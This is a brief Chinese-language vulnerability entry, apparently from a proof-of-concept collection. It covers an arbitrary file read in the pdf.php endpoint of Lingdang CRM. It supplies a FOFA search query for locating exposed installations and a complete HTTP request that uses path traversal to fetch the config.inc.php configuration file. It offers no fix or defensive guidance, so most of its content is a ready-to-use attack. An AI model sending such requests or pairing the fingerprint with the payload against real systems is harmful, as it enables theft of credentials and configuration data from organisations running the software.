# 灵当CRM系统接口pdf.php接口处存在任意文件读取漏洞

灵当CRM系统接口pdf.php接口处存在任意文件读取漏洞，允许攻击者通过恶意读取系统配置文件，获取敏感信息。

## fofa

```javascript
body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
```

## poc

```javascript
GET /crm/data/pdf.php?url=../config.inc.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: Keep-Alive
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181607841.webp)